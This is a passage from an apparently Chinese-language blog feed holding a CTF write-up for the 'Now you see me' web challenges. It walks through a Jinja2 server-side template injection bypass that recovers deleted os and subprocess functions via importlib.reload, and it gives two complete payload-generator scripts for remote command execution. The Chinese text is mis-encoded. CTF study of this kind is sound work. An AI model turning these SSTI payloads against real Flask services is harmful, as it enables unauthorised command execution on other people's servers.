class="hljs-keyword">as</span> e:<br>            counter = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;NO.&#x27;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Error&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Welcome to Hidden_route!&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">import</span> os<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">import</span> _posixsubprocess<br>        <span class="hljs-keyword">del</span> _posixsubprocess.fork_exec<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">import</span> subprocess<br>    <span class="hljs-keyword">del</span> os.popen<br>    <span class="hljs-keyword">del</span> os.system<br>    <span class="hljs-keyword">del</span> subprocess.Popen<br>    <span class="hljs-keyword">del</span> subprocess.call<br>    <span class="hljs-keyword">del</span> subprocess.run<br>    <span class="hljs-keyword">del</span> subprocess.check_output<br>    <span class="hljs-keyword">del</span> subprocess.getoutput<br>    <span class="hljs-keyword">del</span> subprocess.check_call<br>    <span class="hljs-keyword">del</span> subprocess.getstatusoutput<br>    <span class="hljs-keyword">del</span> subprocess.PIPE<br>    <span class="hljs-keyword">del</span> subprocess.STDOUT<br>    <span class="hljs-keyword">del</span> subprocess.CalledProcessError<br>    <span class="hljs-keyword">del</span> subprocess.TimeoutExpired<br>    <span class="hljs-keyword">del</span> subprocess.SubprocessError<br>    sys.addaudithook(audit_checker)<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><br></code></pre></td></tr></table></figure><p>ä¸æ˜¯,å…¨ç»™è¿‡æ»¤äº†ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p><p>å®˜æ–¹é¢˜è§£ï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/3392505-20250315170443488-1898201847.png" alt="img"></p><p>å¯ä»¥ä½¿ç”¨<code>request.endpoint</code>è·å–åˆ°å½“å‰è·¯ç”±çš„å‡½æ•°åï¼Œå³<code>r3al_ins1de_th0ught</code></p><p>ä»ä¸­ï¼Œæˆ‘ä»¬èƒ½è·å–å­—ç¬¦â€™dâ€™, â€˜aâ€™, â€˜tâ€™</p><p>æ³¨æ„åˆ°å¯ä»¥æ‹¼æ¥å‡ºdataã€‚è¿›è€Œè·å–<code>request.data</code>ï¼Œå†åœ¨è¯·æ±‚ä½“ä¸­ä¼ å…¥ä»»æ„å­—ç¬¦è¿›è¡Œç»•è¿‡ã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—ä»»æ„å­—ç¬¦ã€‚</p><h3 id="importlib-reload"><a href="#importlib-reload" class="headerlink" title="importlib.reload"></a>importlib.reload</h3><p>å¯ä»¥çœ‹åˆ°é¢˜ç›®åˆ é™¤äº†RCEçš„æ–¹æ³•ã€‚python2ä¸­å¯ä»¥ä½¿ç”¨reloadå‡½æ•°å¯¹ç±»è¿›è¡Œé‡è½½ï¼Œåœ¨python3ä¸­ï¼Œè¿™ä¸ªå‡½æ•°æ¬åˆ°äº†importlibç±»é‡Œã€‚å¯ä»¥ä»¥æ­¤é‡è½½åˆ°è¢«åˆ é™¤çš„æ–¹æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">del</span> os.system<br>importlib.reload(os)<br>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250414221615965.png" alt="image-20250414221615965"></p><h3 id="audithook"><a href="#audithook" class="headerlink" title="audithook"></a>audithook</h3><p>è‡³äºaudithookæ˜¯ç”¨æ¥é˜²å¥‡æ€ªçš„éé¢„æœŸçš„ï¼Œä¸å¿…åœ¨æ„ã€‚ä½¿ç”¨reloadä¼šè§¦å‘ä¸€æ¬¡complieå’Œexecï¼Œå†åŠ ä¸Šrender_templeteæœ¬èº«å°±æœ‰ä¸€æ¬¡ï¼Œä¸€å…±æ­£å¥½4æ¬¡ã€‚</p><p>åœ¨é—­åˆæ³¨é‡Šç¬¦</p><p>é—­åˆ&#96;&#96;</p><p>æœ€ç»ˆåˆ©ç”¨<br>åˆ°æ­¤ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥æ„é€ ä»»æ„å­—ç¬¦ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ¢å¤RCEç±»ã€‚æˆ‘ä»¬ä¾ç„¶ä½¿ç”¨requestä½œå…¥å£ç±»ï¼Œé€šè¿‡ç»§æ‰¿é“¾æ‰“RCE</p><p>æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li>é—­åˆæ³¨é‡Šè¯­å¥</li><li>request.endpointæ‰¾request.data</li><li>request.dataä»è¯·æ±‚ä½“ä¸­è·å–ä»»æ„å­—ç¬¦</li><li>é€šè¿‡æ‹¼æ¥å­—ç¬¦æ‰“ç»§æ‰¿é“¾æ‰¾åˆ°importlibçš„reloadã€‚åˆ†åˆ«reloados.popenå’Œsubprocess.Popen</li><li>é€šè¿‡requestæ‰“ç»§æ‰¿é“¾æ‰¾osæ‰“RCE</li></ul><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>payload = []<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rce_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    payloadstr = <span class="hljs-string">&quot;&#123;%set%0asub=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;subprocess&#x27;)%&#125;&#123;%set%0aso=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(sub))%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(so))%&#125;&#123;%print(so|attr(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="hljs-string">&quot;&#x27;)|attr(&#x27;read&#x27;)())%&#125;&quot;</span><br><br>    required_encoding = re.findall(<span class="hljs-string">&#x27;\&#x27;([a-z0-9_ /\.]+)\&#x27;&#x27;</span>, payloadstr)<br>    <span class="hljs-comment"># print(required_encoding)</span><br><br>    offset_a = <span class="hljs-number">16</span><br>    offset_0 = <span class="hljs-number">6</span><br><br>    encoded_payloads = &#123;&#125;<br><br>    arg_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> required_encoding:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> encoded_payloads:<br>            p = []<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;_&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.2&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27; &#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.3&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.4&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.5&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j.isnumeric():<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>)+offset_0)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.68&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+offset_a)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>            arg_name = <span class="hljs-string">f&#x27;a<span class="hljs-subst">&#123;arg_count&#125;</span>&#x27;</span><br>            encoded_arg = <span class="hljs-string">&#x27;&#123;%&#x27;</span> + <span class="hljs-string">&#x27;%0a&#x27;</span>.join([<span class="hljs-string">&#x27;set&#x27;</span>, arg_name , <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>.join(p)]) + <span class="hljs-string">&#x27;%&#125;&#x27;</span><br>            encoded_payloads[i] = (arg_name, encoded_arg)<br>            arg_count+=<span class="hljs-number">1</span><br>            payload.append(encoded_arg)<br>    <span class="hljs-comment"># print(encoded_payloads)</span><br>    fully_encoded_payload = payloadstr<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encoded_payloads.keys():<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> fully_encoded_payload:<br>            fully_encoded_payload = fully_encoded_payload.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>+ i +<span class="hljs-string">&quot;&#x27;&quot;</span>, encoded_payloads[i][<span class="hljs-number">0</span>])<br>    <span class="hljs-comment"># print(fully_encoded_payload)</span><br>    payload.append(fully_encoded_payload)<br>command = <span class="hljs-string">&quot;whoami&quot;</span><br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ai%0ain%0arequest.endpoint|slice(1)%&#125;&#x27;</span>)<br>word_data = <span class="hljs-string">&#x27;&#x27;</span><br>endpoint = <span class="hljs-string">&#x27;r3al_ins1de_th0ught&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;data&#x27;</span>:<br>    word_data += <span class="hljs-string">&#x27;i.&#x27;</span> + <span class="hljs-built_in">str</span>(endpoint.find(i)) + <span class="hljs-string">&#x27;~&#x27;</span><br>word_data = word_data[:-<span class="hljs-number">1</span>] <span class="hljs-comment"># delete the last &#x27;~&#x27;</span><br><span class="hljs-comment"># Now we have &quot;data&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data: &quot;</span>+word_data)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%set%0adat=&#x27;</span>+word_data+<span class="hljs-string">&#x27;%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%&#125;&#x27;</span>)<br>generate_rce_command(command)<br><span class="hljs-comment"># payload.append(r&#x27;&#123;%print(j)%&#125;&#x27;)</span><br><span class="hljs-comment"># Here we use the &quot;data&quot; to construct the payload</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/&#x27;</span>)<br><span class="hljs-comment"># use chr() to convert the number to character</span><br><span class="hljs-comment"># hiahiahia~ Now we get all of the charset, SSTI go go go!</span><br><br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>output = <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">r&quot;Follow-your-heart-%23&#125;&quot;</span>+output)<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆåŠŸRCE</p><p>åé¢çš„<code>misc</code>å°±ä¸çœ‹äº†</p><h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2"></a>Now you see me 2</h2><p>æ²¡æœ‰é™åˆ¶è¯·æ±‚å¤´å›æ˜¾ï¼Œæˆ‘ä»¬çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span>(g|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;setattr&#x27;</span>)(g|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;sys&#x27;</span>)|attr(<span class="hljs-string">&#x27;modules&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;werkzeug&#x27;</span>)|attr(<span class="hljs-string">&#x27;serving&#x27;</span>)|attr(<span class="hljs-string">&#x27;WSGIRequestHandler&#x27;</span>),<span class="hljs-string">&#x27;server_version&#x27;</span>,g|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>)|attr(<span class="hljs-string">&#x27;popen&#x27;</span>)(<span class="hljs-string">&#x27;&quot;&quot;&quot;+cmd+&quot;&quot;&quot;&#x27;</span>)|attr(<span class="hljs-string">&#x27;read&#x27;</span>)()))%&#125;<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šä¸€é¢˜ä¸€æ¨¡ä¸€æ ·çš„ç­–ç•¥æ‰“å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   exploit.py</span><br><span class="hljs-string">@Time    :   2025/01/27 17:46:11</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># Please fly little dreams.</span><br><br><span class="hljs-keyword">import</span> re<br>payload = []<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rce_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    payloadstr = <span class="hljs-string">&quot;&quot;&quot;&#123;%set%0asub=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;subprocess&#x27;)%&#125;&#123;%set%0aso=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(sub))%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(so))%&#125;&#123;%print(g|attr(&#x27;pop&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;setattr&#x27;)(g|attr(&#x27;pop&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;sys&#x27;)|attr(&#x27;modules&#x27;)|attr(&#x27;get&#x27;)(&#x27;werkzeug&#x27;)|attr(&#x27;serving&#x27;)|attr(&#x27;WSGIRequestHandler&#x27;),&#x27;server_version&#x27;,g|attr(&#x27;pop&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;get&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;&quot;&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;&quot;&quot;&#x27;)|attr(&#x27;read&#x27;)()))%&#125;&quot;&quot;&quot;</span><br><br>    required_encoding = re.findall(<span class="hljs-string">&#x27;\&#x27;([a-z0-9_ /\.]+)\&#x27;&#x27;</span>, payloadstr)<br>    <span class="hljs-comment"># print(required_encoding)</span><br>    required_encoding.append(<span class="hljs-string">&#x27;WSGIRequestHandler&#x27;</span>)<br>    offset_a = <span class="hljs-number">16</span><br>    offset_0 = <span class="hljs-number">6</span><br>    offset_A = <span class="hljs-number">42</span><br>    encoded_payloads = &#123;&#125;<br><br>    arg_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> required_encoding:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> encoded_payloads:<br>            p = []<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;_&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.2&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27; &#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.3&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.4&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.5&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j.isnumeric():<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>)+offset_0)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.68&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(j) &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(j) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+offset_a)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(j) &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(j) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>):<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+offset_A)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>            arg_name = <span class="hljs-string">f&#x27;a<span class="hljs-subst">&#123;arg_count&#125;</span>&#x27;</span><br>            encoded_arg = <span class="hljs-string">&#x27;&#123;%&#x27;</span> + <span class="hljs-string">&#x27;%0a&#x27;</span>.join([<span class="hljs-string">&#x27;set&#x27;</span>, arg_name , <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>.join(p)]) + <span class="hljs-string">&#x27;%&#125;&#x27;</span><br>            encoded_payloads[i] = (arg_name, encoded_arg)<br>            arg_count+=<span class="hljs-number">1</span><br>            payload.append(encoded_arg)<br>    <span class="hljs-comment"># print(encoded_payloads)</span><br>    fully_encoded_payload = payloadstr<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encoded_payloads.keys():<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> fully_encoded_payload:<br>            fully_encoded_payload = fully_encoded_payload.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>+ i +<span class="hljs-string">&quot;&#x27;&quot;</span>, encoded_payloads[i][<span class="hljs-number">0</span>])<br>    <span class="hljs-comment"># print(fully_encoded_payload)</span><br>    payload.append(fully_encoded_payload)<br>command = <span class="hljs-string">&quot;whoami&quot;</span><br>full_payload = <span class="hljs-string">&#x27;&#x27;&#x27;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;&quot; + cmd + &quot;&#x27;)|attr(&#x27;read&#x27;)())%&#125;&#x27;&#x27;&#x27;</span><br>endpoint = <span class="hljs-string">&quot;r3al_ins1de_thought&quot;</span><br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ai%0ain%0arequest.endpoint|slice(1)%&#125;&#x27;</span>)<br>word_data = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;data&#x27;</span>:<br>    word_data += <span class="hljs-string">&#x27;i.&#x27;</span> + <span class="hljs-built_in">str</span>(endpoint.find(i)) + <span class="hljs-string">&#x27;~&#x27;</span><br>word_data = word_data[:-<span class="hljs-number">1</span>] <span class="hljs-comment"># delete the last &#x27;~&#x27;</span><br><span class="hljs-comment"># Now we have &quot;data&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data: &quot;</span>+word_data)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%set%0adat=&#x27;</span>+word_data+<span class="hljs-string">&#x27;%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%&#125;&#x27;</span>)<br>generate_rce_command(command)<br><span class="hljs-comment"># payload.append(r&#x27;&#123;%print(j)%&#125;&#x27;)</span><br><span class="hljs-comment"># Here we use the &quot;data&quot; to construct the payload</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/&#x27;</span>)<br><span class="hljs-comment"># use chr() to convert the number to character</span><br><span class="hljs-comment"># hiahiahia~ Now we get all of the charset, SSTI go go go!</span><br><br><br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>output = <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">r&quot;fly-%23&#125;&quot;</span>+output)<br></code></pre></td></tr></table></figure><h2 id="æ€è€ƒ-3"><a href="#æ€è€ƒ-3" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>ctfçš„æˆé•¿é€Ÿåº¦å¤§äºctferçš„æˆé•¿é€Ÿåº¦ï¼ŒğŸ¤¡ğŸ¤¡</p><p>å°åŠæœˆæ²¡æ‰“ctfå®Œå…¨è·Ÿä¸ä¸Šäº†ï¼Œæˆ‘é </p>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRFæ·±å…¥å‰–æ+å›½å…‰SSRFé¶åœºæ”»å…‹</title>
